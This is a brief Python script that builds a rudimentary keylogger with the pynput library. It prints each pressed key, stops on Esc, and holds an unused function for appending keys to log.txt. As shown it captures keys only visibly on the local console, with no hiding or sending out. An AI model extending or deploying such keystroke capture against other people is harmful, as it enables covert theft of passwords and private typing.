from pynput.keyboard import Key, Listener

keys = []
count = 0


def on_press(key):
    print("{0} pressed".format(key))


def on_release(key):
    if key == Key.esc:
        return False


def write_key(key):
    pass


def write_file(keys):
    with open("log.txt", "a") as f:
        for k in keys:
            f.write(k)


with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
